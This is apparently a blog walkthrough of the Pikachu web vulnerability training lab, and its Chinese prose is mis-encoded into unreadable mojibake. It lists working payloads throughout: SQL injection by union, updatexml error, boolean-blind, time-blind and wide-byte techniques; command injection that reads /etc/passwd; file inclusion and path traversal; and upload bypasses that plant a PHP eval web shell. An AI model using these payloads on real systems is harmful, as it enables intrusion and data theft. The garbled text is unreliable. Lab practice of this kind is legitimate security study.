<h3 id="æœç´¢å‹æ³¨å…¥"><a href="#æœç´¢å‹æ³¨å…¥" class="headerlink" title="æœç´¢å‹æ³¨å…¥"></a>æœç´¢å‹æ³¨å…¥</h3><p>å…ˆäº‹å…ˆç®€å•äº†è§£ä¸‹<strong>æ¨¡ç³ŠæŸ¥è¯¢</strong>çš„æ¦‚å¿µ</p>
<p>å¤§æ¦‚ï¼Œä¸»è¦æ˜¯likeè¯­å¥ï¼Œä¸â€˜%â€™çš„é…åˆä½¿ç”¨<br>ä¾‹å¦‚<code>select * from users where username like &#39;%å©‰%&#39;</code><br>è¿™æ ·ä¼šæœç´¢å‡ºusernameåƒâ€œXå©‰â€ã€â€œXå©‰Xâ€ã€â€œå©‰XXXXâ€ç­‰æœ‰â€œå©‰â€çš„è®°å½•</p>
<p>å‡ ä¸ªä¸»è¦çš„ç¬¦å·ï¼š</p>
<ul>
<li><p>%ï¼šè¡¨ç¤ºä»»æ„0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚å¯åŒ¹é…ä»»æ„ç±»å‹å’Œé•¿åº¦çš„å­—ç¬¦ï¼Œæœ‰äº›æƒ…å†µä¸‹è‹¥æ˜¯ä¸­æ–‡ï¼Œè¯·ä½¿ç”¨ä¸¤ä¸ªç™¾åˆ†å·ï¼ˆ%%ï¼‰è¡¨ç¤º</p>
</li>
<li><p>_ï¼šè¡¨ç¤ºä»»æ„å•ä¸ªå­—ç¬¦ã€‚åŒ¹é…å•ä¸ªä»»æ„å­—ç¬¦ï¼Œå®ƒå¸¸ç”¨æ¥é™åˆ¶è¡¨è¾¾å¼çš„å­—ç¬¦é•¿åº¦è¯­å¥</p>
</li>
<li><p>[]ï¼šåŒ¹é…ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼</p>
</li>
</ul>
<p>å‰©ä¸‹çš„è‡ªå·±çœ‹<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-lin-x-c-/p/10375412.html">åšå®¢</a>å»å§ï¼Œå»å§å»å§å»å§</p>
<hr>
<p>æŸ¥æ‰¾æ¡†<br>æŸ¥è¯¢ä¸€ä¸ªâ€œlâ€ï¼Œå›æ˜¾â€œallenâ€ã€â€œlucyâ€ã€â€œliliâ€<br>çŒœæµ‹SQLè¯­å¥ç±»ä¼¼äº<br><code>select name,id,email from users where name like &#39;%&#123;input&#125;%&#39;</code><br>æ‰€ä»¥çŒœæµ‹è¦é—­åˆçš„æœ‰ç™¾åˆ†å·å’Œå¼•å·</p>
<p>å°è¯•åœ°å€æ æ³¨å…¥</p>
<p><code>zwc</code>ï¼š0oã€‚..æ²¡æœ‰æœç´¢åˆ°ä½ è¾“å…¥çš„ä¿¡æ¯ï¼</p>
<p><code>zwc%&#39; or 1=1 %23</code>ï¼šå…¨æ³¨å‡ºæ¥äº†</p>
<p><code>zwc%&#39; union select 1,2,3 %23</code>ï¼šåˆ¤æ–­åˆ—æ•°ä¸ºä¸‰</p>
<p>å‰©ä¸‹çš„å’Œä¸Šé¢å·®ä¸å¤š</p>
<h3 id="XXå‹æ³¨å…¥"><a href="#XXå‹æ³¨å…¥" class="headerlink" title="XXå‹æ³¨å…¥"></a>XXå‹æ³¨å…¥</h3><blockquote>
<p>ç®¡tmdçš„ä»€ä¹ˆå‹ï¼Œèƒ½å¤Ÿåˆ¶é€ å‡ºé—­åˆï¼Œå°±æ˜¯æœ¬äº‹</p>
</blockquote>
<p>å¥½æç¤ºï¼Œçœ‹æ¥æ˜¯è¦è‡ªå·±æ¢ç´¢ä¸‹è¯­å¥æ ¼å¼</p>
<p><code>&#39;</code>ï¼šcheck the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™â€™â€™)â€™ at line 1ï¼ˆWTFï¼‰</p>
<p><code>&#39;) or 1=1 %23</code>ï¼šå…¨æ³¨</p>
<p>ä¸‹ç•¥</p>
<h3 id="â€œinsert-updateâ€æ³¨å…¥"><a href="#â€œinsert-updateâ€æ³¨å…¥" class="headerlink" title="â€œinsert&#x2F;updateâ€æ³¨å…¥"></a>â€œinsert&#x2F;updateâ€æ³¨å…¥</h3><p>å…ˆæ³¨å†Œä¸€ä¸ªï¼Œç„¶åç™»å…¥<br>ç„¶åä¿®æ”¹ä¸ªäººä¿¡æ¯</p>
<p>çœ‹ä¸€ä¸‹æ•°æ®åŒ…ï¼Œä¿®æ”¹æ“ä½œå¥½åƒåªæ˜¯POSTä¸€äº›å‚æ•°ä¸Šå»<br>å…¶ä¸­å§“åå­—æ®µä¸èƒ½æ”¹ï¼Œæ˜¯å›ºå®šçš„</p>
<p>çŒœæµ‹åç«¯çš„SQLè¯­å¥ç±»ä¼¼äºï¼š<br><code>update table set field1=&#39;XXX&#39;,field2=&#39;XXX&#39; where name=&#39;Archeri&#39;</code></p>
<p>å¦‚æœå­˜åœ¨æ³¨å…¥ï¼Œé‚£å¯èƒ½å­˜åœ¨è¿™ç§æƒ…å†µï¼šä¸»åŠ¨é—­åˆï¼Œæ³¨é‡Šæ‰åé¢çš„â€˜whereâ€™é™å®š<br>å¯¼è‡´æ‰€æœ‰ç”¨æˆ·éƒ½è¢«ä¿®æ”¹ä¿¡æ¯</p>
<p>æ–°æ³¨å†Œä¸€ä¸ªuser1ç”¨æˆ·ï¼Œå…¶ä½™ä¿¡æ¯éƒ½æ˜¯â€˜xxxâ€™<br>ç„¶åå›åˆ°Archeriç”¨æˆ·ï¼Œä¿®æ”¹ä¿¡æ¯ï¼š</p>
<img src="image-20211122084907443.png" alt="image-20211122084907443" style="zoom:67%;" />

<p>ç„¶åå‘ç°äº†è¿™ä¸ªæŠ¥é”™ï¼šcheck the manual that corresponds to your MySQL server version for the right syntax to use near â€˜qqqâ€™,address&#x3D;â€™qqqâ€™,email&#x3D;â€™qqqâ€™ where username&#x3D;â€™Archeriâ€™â€™ at line 1</p>
<p>æ€§åˆ«ä¸€æ æ¢æˆè¿™ä¸ªï¼š<code>daddy&#39;; #</code><br>ç„¶åå‘ç°æˆåŠŸä¿®æ”¹äº†user1ç”¨æˆ·çš„æ€§åˆ«</p>
<hr>
<p>ä¸‹é¢æ³¨å‡ºå…¶ä»–ä¿¡æ¯</p>
<p>æ€§åˆ«ä¸€æ ï¼š<code>hack&#39;,phonenum=database() where username=&#39;Archeri&#39;; #</code><br>æ‰‹æœºä¸€æ æˆåŠŸå˜æˆäº†å½“å‰æ•°æ®åº“å</p>
<p>æ³¨è¡¨åï¼š<code>hack&#39;,phonenum=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where username=&#39;Archeri&#39;; #</code></p>
<p>ä¸‹ç•¥</p>
<hr>
<p>ä¸å°å¿ƒå¿½ç•¥äº†æ³¨å†Œé¡µé¢ä¹Ÿå¯ä»¥æ³¨å…¥</p>
<p>å§“åå¡«å…¥ä¸€ä¸ªå¼•å·ï¼šcheck the manual that corresponds to your MySQL server version for the right syntax to use near â€˜xxxâ€™),â€™â€™,â€™â€™,â€™â€™,â€™â€™)â€™ at line 1</p>
<p>å§“åå¡«å…¥<code>&#39;)</code>ï¼Œå¯†ç éšä¾¿å¡«ï¼šcheck the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™,md5(â€˜asdâ€™),â€™â€™,â€™â€™,â€™â€™,â€™â€™)â€™ at line 1</p>
<p><del>çœ‹æ¥è¿˜æœ‰ä¸ªmd5å¤„ç†å¯†ç éœ€è¦çœ‹çœ‹æ€ä¹ˆé—­åˆä¸‹</del><br>å…¶å®ä¹Ÿä¸ç”¨å¤„ç†ï¼Œåªæ˜¯å½±å“åˆ°è¿™ä¸ªè´¦å·èƒ½ä¸èƒ½æ­£å¸¸ç™»å…¥è€Œå·²</p>
<p>æ—¢ç„¶ä¸ºæ³¨å†Œï¼Œé‚£çŒœä»–SQLè¯­å¥åº”è¯¥æ˜¯ç±»ä¼¼ä¸ºï¼š<br><code>insert into table (field1,field2) values (&#39;XXX&#39;,&#39;XXX&#39;)</code></p>
<p><strong>updatexmlæ³¨å…¥</strong><br><strong>å®Œæ•´æŠ¥é”™ä¿¡æ¯ï¼Œä¸”æ²¡æœ‰åˆ«çš„å¾ˆå¥½çš„å›æ˜¾ä½ç½®ï¼Œè€ƒè™‘ä½¿ç”¨updatexmlå‡½æ•°æ³¨å…¥</strong></p>
<p>æ³¨å‡ºå½“å‰æ•°æ®åº“ç”¨æˆ·åï¼ˆæ³¨æ„<strong>åˆ—æ•°è¦ä¸€è‡´</strong>ï¼‰ï¼š<br><code>aaa&#39; or updatexml(1,concat(0x7e,(select user()),0x7e),1),md5(&#39;bbb&#39;),&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;) #</code></p>
<p>å‰©ä¸‹çš„å°±æ”¹updatexmlå‡½æ•°é‡Œé¢ä¸­é—´çš„å­—ç¬¦ä¸²å‚æ•°</p>
<h3 id="â€œdeleteâ€æ³¨å…¥"><a href="#â€œdeleteâ€æ³¨å…¥" class="headerlink" title="â€œdeleteâ€æ³¨å…¥"></a>â€œdeleteâ€æ³¨å…¥</h3><p>ä¸€ä¸ªç•™è¨€æ¿ï¼Œå‘è¡¨åèƒ½åˆ é™¤<br>çœ‹çœ‹æ•°æ®åŒ…ï¼Œç•™è¨€ç”¨POSTï¼Œåˆ é™¤ç”¨GET<br>åˆ é™¤çš„GETæœ‰ä¸€ä¸ªidå‚æ•°ï¼Œæ€€ç–‘è¿™é‡Œæ˜¯æ³¨å…¥ç‚¹</p>
<p>å‚æ•°è®¾ä¸ºâ€˜â€™â€™ï¼šcheck the manual that corresponds to your MySQL server version for the right syntax to use near â€˜â€™â€™ at line 1</p>
<p><strong>å®Œæ•´æŠ¥é”™ä¿¡æ¯ï¼Œä¸”æ²¡æœ‰åˆ«çš„å¾ˆå¥½çš„å›æ˜¾ä½ç½®ï¼Œè€ƒè™‘ä½¿ç”¨updatexmlå‡½æ•°æ³¨å…¥</strong></p>
<p>payloadï¼ˆæ•°å­—å‹ä¸ç”¨å¼•å·ï¼‰ï¼š<br><code>?id=9999 or updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<h3 id="â€œhttp-headerâ€æ³¨å…¥"><a href="#â€œhttp-headerâ€æ³¨å…¥" class="headerlink" title="â€œhttp headerâ€æ³¨å…¥"></a>â€œhttp headerâ€æ³¨å…¥</h3><p>ç™»å½•ï¼Œç„¶åä¿¡æ¯æ˜¾ç¤ºæœ‰IPã€user agentã€http acceptã€æœ¬æ¬¡è¿æ¥ç«¯å£<br>å¯èƒ½æ˜¯æŠŠå‘é€è¯·æ±‚åŒ…çš„headerå°äº†å‡ºæ¥</p>
<p>æŠ“åŒ…é‡æ”¾æ”¹äº†ä¸¤ä¸ªheaderè¯•è¯•ï¼Œè¿˜çœŸæ˜¯</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211122103200217.png" alt="image-20211122103200217"></p>
<p>agentæ‰“å…¥ä¸€ä¸ªå¼•å·ï¼Œæœ‰å®Œæ•´æŠ¥é”™ä¿¡æ¯ï¼šcheck the manual that corresponds to your MySQL server version for the right syntax to use near â€˜testestestestâ€™,â€™54014â€™)â€™ at line 1</p>
<p>çŒœSQLï¼š<code>select &#39;IP&#39;,&#39;AGENT&#39;,&#39;ACCEPT&#39;,&#39;PORT&#39; ...</code></p>
<p>ä½†æ˜¯agentæ‰“å…¥è¿™ä¸ªå´ä¼šå®Œæ•´æ˜¾ç¤ºå‡ºæ¥ï¼š<br><code>aaa&#39;,database(),user()) #</code></p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211122104758072.png" alt="image-20211122104758072"></p>
<p>updatexml()å€’æ˜¯å¯ä»¥ï¼š<br><code>&#39; or updatexml(1,concat(0x7e,(select database()), 0x7e),1),1,1) #</code></p>
<h3 id="æŠ¥é”™ç›²æ³¨"><a href="#æŠ¥é”™ç›²æ³¨" class="headerlink" title="æŠ¥é”™ç›²æ³¨"></a>æŠ¥é”™ç›²æ³¨</h3><p><del>å‘ƒï¼Œåˆæ¥</del></p>
<p>å­˜åœ¨ç”¨æˆ·ï¼ˆä¹‹å‰æ³¨å†Œçš„ï¼‰å°±ç»™å‡ºä¿¡æ¯ï¼Œæ²¡æœ‰å°±ç»™å‡ºä¸€æ¡å›ºå®šçš„é”™è¯¯ä¿¡æ¯</p>
<p>è¿™é‡Œä¸€å®šè¦å…ˆä½¿å‰é¢çš„æ¡ä»¶æˆç«‹ï¼Œå³è¦å…ˆæœ‰ä¸€ä¸ªå­˜åœ¨çš„ç”¨æˆ·ï¼Œä¾‹å¦‚ï¼š<br><code>Archeri&#39; and 1=1 #</code>å¯ä»¥<br><code>Archeri&#39; and 1=2 #</code>ä¸è¡Œ<br><code>&#39; or 1=1 #</code>ä¸è¡Œ</p>
<p>å…¶ä»–æƒ…å†µéœ€è¦è‡ªè¡Œåˆ¤æ–­æ€ä¹ˆç›²æ³¨</p>
<hr>
<p><code>Archeri&#39; and length(database())=7 #</code></p>
<p><code>Archeri&#39; and ascii(substr(database(),1,1))&gt;97 #</code></p>
<p>å‰©ä¸‹çš„ç•¥äº†ï¼Œçœ‹çœ‹sqli-labsé¶åœºçš„ç¬”è®°<br>æ€»ä¹‹å°±æ˜¯ç†Ÿæ‚‰length()ã€substr()ã€ascii()ä»¥åŠlimitç­‰çš„ä½¿ç”¨</p>
<h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><p>å’Œä¸Šé¢ä¸ä¸€æ ·çš„æ˜¯ï¼Œä¸ç®¡è¾“å…¥çš„ç”¨æˆ·åå­˜ä¸å­˜åœ¨ï¼Œå›æ˜¾éƒ½æ˜¯ç»Ÿä¸€çš„</p>
<p>ä½†æ˜¯å¯ä»¥ç”¨sleep()å‡½æ•°ç»“åˆé€»è¾‘å…³ç³»çš„ä¼˜å…ˆçº§æ¥å®ç°æ—¶é—´ç›²æ³¨ï¼Œä¾‹å¦‚ï¼š<br><code>lili&#39; and database()=&#39;pikaccc&#39; and sleep(5) #</code>å¾ˆå¿«å›æ˜¾<br><code>lili&#39; and database()=&#39;pikachu&#39; and sleep(5) #</code>æœ‰æ˜æ˜¾å»¶è¿Ÿ</p>
<p>è¿™æ ·å°±å¯ä»¥è¾¾åˆ°ç›²æ³¨çš„æ•ˆæœ</p>
<p>ä¸‹ç•¥</p>
<h3 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h3><p>ä¸»è¦æ˜¯åˆ©ç”¨äº†GBKç³»åˆ—ç¼–ç ï¼Œ<strong>å°†ä¸¤ä¸ªå­—èŠ‚å½“æˆæ˜¯ä¸€ä¸ªä¸­æ–‡å­—ç¬¦</strong>çš„åŸç†</p>
<p>ç›¸å…³é…ç½®ä¸ºï¼š<code>set character_set_client = gbk</code></p>
<p>ä¸€èˆ¬ä¸ºå¼•å·è¢«åŠ ä¸Šåæ–œæ è½¬ä¹‰çš„æƒ…å†µ<br><code>1&#39; and 1=1 #</code>-&gt;<code>1\&#39; and 1=1 #</code><br>ç›¸å½“äºæŸ¥è¯¢idä¸ºâ€˜1â€™ and 1&#x3D;1 #â€™çš„ä¿¡æ¯</p>
<p>ä½†æ˜¯å¯ä»¥ä¸»åŠ¨åŠ ä¸Šä¸€ä¸ªâ€˜%dfâ€™<br><code>1%df&#39; and 1=1 #</code>-&gt;<code>1%df\&#39; and 1=1 #</code>-&gt;<code>1%df%5c&#39; and 1=1 #</code>-&gt;<code>1è¼¼&#39; and 1=1 #</code><br>ç›¸å½“äºæŸ¥è¯¢idä¸ºâ€˜1è¼¼â€™çš„ä¿¡æ¯ï¼Œç„¶åæ‰§è¡Œandåé¢çš„åˆ¤æ–­</p>
<p>æˆ‘è¿™é‡Œè¦æ”¹æ”¹MySQLçš„é…ç½®æ–‡ä»¶ï¼Œå› ä¸ºä»–é»˜è®¤å­—ç¬¦é›†æ˜¯utf8<br>ï¼ˆä½†æ˜¯ä¸€æ”¹å°±ä¼šæŠ¥é”™ï¼Œå‚»é€¼å°çš®ï¼‰</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="æ¦‚è¿°-3"><a href="#æ¦‚è¿°-3" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´<br>æ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šå‡ºç°äº†æä¾›ç»™ç”¨æˆ·è¿›è¡Œè¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£</p>
<p>ç°åœ¨æœ‰å¾ˆå¤šç”²æ–¹ä¼ä¸šæœ‰ä¸€äº›â€œè‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€ï¼Œå¾ˆå®¹æ˜“æœ‰RCEæ¼æ´</p>
<p>å¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£<br>ä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­<br>æ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•</p>
<h3 id="exec-â€œpingâ€"><a href="#exec-â€œpingâ€" class="headerlink" title="exec â€œpingâ€"></a>exec â€œpingâ€</h3><p>ä¸€ä¸ªè¾“å…¥æ ï¼Œæé†’ä½ è¾“å…¥IPåœ°å€å»ping<br>è¾“å…¥â€œ10.10.10.1â€ï¼Œè¿”å›pingçš„ç»ˆç«¯è¾“å‡ºç»“æœ</p>
<p>è¾“å…¥<code>; echo &quot;haha&quot;</code>ï¼Œå›æ˜¾â€œhahaâ€ï¼Œæœ‰RCEæ¼æ´</p>
<p>å¯ä»¥ä½¿ç”¨åˆ†å·ä¸²è”æ¶æ„å‘½ä»¤</p>
<p><code>; whoami; cat /etc/passwd</code></p>
<h3 id="exec-â€œevelâ€"><a href="#exec-â€œevelâ€" class="headerlink" title="exec â€œevelâ€"></a>exec â€œevelâ€</h3><p>è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œåå°æ”¾åˆ°eval()å‡½æ•°é‡Œæ‰§è¡Œ</p>
<p>å¡«å…¥<code>phpinfo();</code>ï¼Œé¡µé¢å˜æˆphpinfoé¡µ</p>
<p>eval()é‡Œé¢å¡«å…¥çš„åº”è¯¥æ˜¯<strong>æ ¼å¼æ­£ç¡®çš„PHPä»£ç </strong></p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="æ¦‚è¿°-4"><a href="#æ¦‚è¿°-4" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦ä¸€ä¸ªä»£ç æ–‡ä»¶<br>ä¾‹å¦‚PHPçš„ä¸‹åˆ—å‡½æ•°ï¼š</p>
<ul>
<li>include()&#x2F;include_once()</li>
<li>require()&#x2F;require_once()</li>
</ul>
<p>å¦‚æœåŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯ä¸€ä¸ªå˜é‡ï¼Œå¹¶ä¸”<strong>å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶</strong><br>é‚£å°±å¾ˆå¯èƒ½ä¼šæœ‰æ–‡ä»¶åŒ…å«æ¼æ´</p>
<p>ä¸€èˆ¬åˆ†ä¸¤ç§ï¼š</p>
<ul>
<li>æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆlocalï¼‰<br>ä»…èƒ½å¯¹æœåŠ¡å™¨æœ¬åœ°æ–‡ä»¶è¿›è¡ŒåŒ…å«ã€‚ä¸€èˆ¬åŒ…å«æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼Œæˆ–è€…ç»“åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´æ¥æ‰“ç»„åˆæ‹³</li>
<li>è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼ˆremoteï¼‰<br>ä¸€èˆ¬æ˜¯èƒ½å¤Ÿé€šè¿‡urlæ¥åŒ…å«è¿œç¨‹æ–‡ä»¶ï¼Œå±å®³å¤§å¾—å¤šå¾—å¤š</li>
</ul>
<p>å› æ­¤å°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·æ§åˆ¶æ–‡ä»¶åŒ…å«å‡½æ•°çš„å˜é‡<br>ä¸‡ä¸å¾—å·²ä¹Ÿè¦åšä¸¥æ ¼çš„ç™½åå•è¿‡æ»¤</p>
<h3 id="local"><a href="#local" class="headerlink" title="local"></a>local</h3><p>ä¸€ä¸ªé€‰æ‹©æ¡†ï¼Œé€‰æ‹©NBAæ˜æ˜Ÿæäº¤ï¼Œè¿”å›ç›¸å…³ä¿¡æ¯</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯URLé‡Œå‡ºç°äº†ä¸€ä¸ª<code>filename=file2.php</code><br>ä¼°è®¡è¿™é‡Œå°±æ˜¯åŒ…å«ç‚¹</p>
<p>èƒ½é€‰æ‹©çš„å°±åªæœ‰5ä¸ªæ˜æ˜Ÿï¼Œç›´æ¥æäº¤<code>filename=file6.php</code><br>å°±å‘ç°ç§˜å¯†äº†</p>
<img src="image-20211123090853752.png" alt="image-20211123090853752" style="zoom:67%;" />

<p>åŒ…å«ä¸‹ä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå‘ç°ä¸€äº›æŠ¥é”™ä¿¡æ¯æŠŠç›¸å…³è·¯å¾„ç»™äº†å‡ºæ¥</p>
<p>ç„¶åæƒ³é€šè¿‡è¿™ä¸ª<code>../../../../../etc/passwd</code>åŒ…å«ä¸€ä¸‹passwdï¼Œå´æŠ¥é”™ï¼š</p>
<blockquote>
<p>Warning: include(): open_basedir restriction in effect. File(&#x2F;etc&#x2F;passwd) is not within the allowed path(s): (&#x2F;www&#x2F;pikachu-master&#x2F;:&#x2F;tmp&#x2F;:&#x2F;proc&#x2F;) in &#x2F;www&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php on line 23</p>
<p>Warning: include(&#x2F;etc&#x2F;passwd): failed to open stream: Operation not permitted in &#x2F;www&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php on line 23</p>
<p>Warning: include(): Failed opening â€˜include&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwdâ€™ for inclusion (include_path&#x3D;â€™.:&#x2F;usr&#x2F;local&#x2F;phpstudy&#x2F;soft&#x2F;php&#x2F;php-5.5.38&#x2F;lib&#x2F;phpâ€™) in &#x2F;www&#x2F;pikachu-master&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php on line 23</p>
</blockquote>
<p>å¥½åƒæ˜¯PHPç›¸å…³çš„æƒé™è®¾ç½®é—®é¢˜ï¼Œå§</p>
<h3 id="remote"><a href="#remote" class="headerlink" title="remote"></a>remote</h3><p>ç•Œé¢å’Œä¸Šé¢ä¸€æ ·ï¼Œä½†æ˜¯URLå˜æˆäº†è¿™æ ·ï¼š<br><code>filename=include%2Ffile1.php</code><br>å…¶å®å°±æ˜¯ä»£ç ä¸­å»æ‰äº†<code>include/</code>çš„å‰ç¼€é™åˆ¶ï¼Œä½¿å¾—èƒ½å¤ŸåŒ…å«è¿œç¨‹æ–‡ä»¶<br>ä¾‹å¦‚ç›´æ¥ä¼ å…¥ä¸€ä¸ªè¿œç¨‹æ‰˜ç®¡çš„PHPä»£ç åœ°å€ï¼š<br><code>https://github.com/zhuifengshaonianhanlu/pikachu/blob/master/footer.php</code><br>é¡µé¢å°±ä¼šå˜å¾—å¾ˆå¥‡æ€ª</p>
<p>æœ€åæœ€å¥½å­¦ä¸€ä¸‹PHP includeçš„ç”¨æ³•</p>
<h2 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h2><h3 id="æ¦‚è¿°-5"><a href="#æ¦‚è¿°-5" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ç±»ä¼¼äºä»»æ„æ–‡ä»¶è¯»å–ï¼Œå°±æ˜¯å¯¹äºä¸‹è½½æœåŠ¡å™¨ä¸Šèµ„æºçš„å‚æ•°ä¸åŠ ä»¥é™åˆ¶<br>ç”¨æˆ·èƒ½å¤Ÿä»»æ„æ“ä½œï¼Œä»è€Œä¸‹è½½æœåŠ¡å™¨æ•æ„Ÿæ–‡ä»¶</p>
<h3 id="ç»ƒä¹ "><a href="#ç»ƒä¹ " class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h3><p>ä¸€ä¸ªNBAçƒæ˜Ÿé¡µé¢ï¼Œç‚¹å‡»è¿æ¥ï¼ŒGETè¯·æ±‚ä¼ é€’filenameå‚æ•°<br><code>filename=kb.png</code><br>ä»è€Œä¸‹è½½æ–‡ä»¶</p>
<p>passwdæ–‡ä»¶æœ‰æƒé™é™åˆ¶ï¼Œ<code>../../../../../tmp/mysql.sock</code>èƒ½ä¸‹</p>
<h2 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h2><h3 id="æ¦‚è¿°-6"><a href="#æ¦‚è¿°-6" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><p>ä¸Šä¼ å¤´åƒã€é™„ä»¶ç­‰åœºæ™¯</p>
<p>ä¸€èˆ¬é˜²èŒƒæªæ–½ï¼š</p>
<ul>
<li>éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€ã€å¤§å°</li>
<li>éªŒè¯æ–‡ä»¶ä¸Šä¼ æ–¹å¼</li>
<li>å¯¹ä¸Šä¼ åçš„æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å</li>
<li>ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„</li>
</ul>
<h3 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h3><p>é¡µé¢è¯´åªå…è®¸ä¸Šä¼ å›¾ç‰‡ï¼Œå“¦</p>
<p>POSTä¸Šä¼ ï¼Œä¸Šä¼ åç»™å‡ºæ–‡ä»¶ä¿å­˜è·¯å¾„</p>
<p>å‡†å¤‡å¥½ä¸€å¥è¯ï¼š<code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code><br>ç›´æ¥ä¸Šä¼ ï¼Œå‘ç°è¢«æ‹¦äº†</p>
<p>æŠ“åŒ…æ”¹åŒ…é‡æ”¾ï¼ˆä¸‹é¢çš„GETæ–¹æ³•è¦æ”¹æˆPOSTï¼‰</p>
<p><img src="/2022/10/06/Web%E9%9D%B6%E5%9C%BA-Pikachu/image-20211123101014334.png" alt="image-20211123101014334"></p>
<p>å‘ç°å°±å¯ä»¥äº†ï¼Œå¹¶ä¸”ç»™å‡ºäº†ä¸Šä¼ è·¯å¾„ï¼Œèšå‰‘è¿è¿çœ‹ï¼ŒOK</p>
<p>æ€»ä¹‹è§£é‡Šï¼Œåªåœ¨å‰ç«¯åšäº†é˜²æŠ¤ï¼Œéšä¾¿ç»•</p>
<h3 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h3><p>é¡µé¢å’Œä¸Šé¢ä¸€æ ·ï¼Œä½†æ˜¯å¯ä»¥é€‰æ‹©phpæ–‡ä»¶ï¼Œå˜æˆç‚¹å‡»ä¸Šä¼ åè¿”å›é”™è¯¯ä¿¡æ¯</p>
<p>æŠ“åŒ…ï¼Œå°†åŸæœ¬çš„Content-Typeï¼š<br><code>application/x-php</code>-&gt;<code>image/png</code><br>ç„¶åå°±ä¸Šä¼ æˆåŠŸäº†</p>
<p>èšå‰‘è¿æ¥ï¼ŒOK</p>
<p>çœ‹çœ‹æºç ï¼Œå‘ç°æ˜¯åªå¯¹MIME typeè¿›è¡Œäº†æ£€éªŒ</p>
<h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize()"></a>getimagesize()</h3><p>é¡µé¢è¿˜æ˜¯å’Œä¸Šé¢ä¸€æ ·<br>æç¤ºè¯´ç”¨äº†PHPçš„getimagesize()å‡½æ•°<br>å†²å†²æµªï¼Œæ˜¯æ ¹æ®å›¾åƒè¿”å›å›¾åƒçš„å¤§å°åŠç›¸å…³ä¿¡æ¯<br>ä¼°è®¡è¦æ±‚ä¸Šä¼ çš„æ–‡ä»¶ä¸­çœŸçš„åŒ…å«å›¾åƒå†…å®¹</p>
<p>å•çº¯æ”¹Content-Typeè¡Œä¸é€š</p>
<p>é‚£å°±æ”¹ä¸Šä¼ æ­£å¸¸å›¾ç‰‡çš„é‚£ä¸ªåŒ…ï¼Œåœ¨å†…å®¹æœ€åé¢åŠ ä¸Šä¸€å¥è¯<br>å¯ä»¥ä¸Šä¼ ï¼Œå¹¶ä¸”ç»™å‡ºäº†ä¸Šä¼ è·¯å¾„ï¼ˆ00é˜¶æ®µç»•ä¸è¿‡ï¼‰</p>
